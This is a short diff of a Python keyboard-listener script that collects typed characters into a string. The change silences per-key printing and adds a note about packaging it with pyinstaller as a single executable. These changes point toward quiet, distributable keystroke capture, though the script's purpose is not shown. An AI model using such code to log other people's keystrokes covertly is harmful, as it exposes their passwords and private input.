@@ -42,7 +42,7 @@ def on_press(key):
             word = word[:-1]
             #print('wrong code')
             return
-        print(format(key.char))
+        #print(format(key.char))
         word += format(key.char)
     except AttributeError:
         pass
@@ -53,3 +53,4 @@ def on_press(key):
 with keyboard.Listener(
         on_press=on_press) as listener:
     listener.join()
+#pyinstaller --onefile
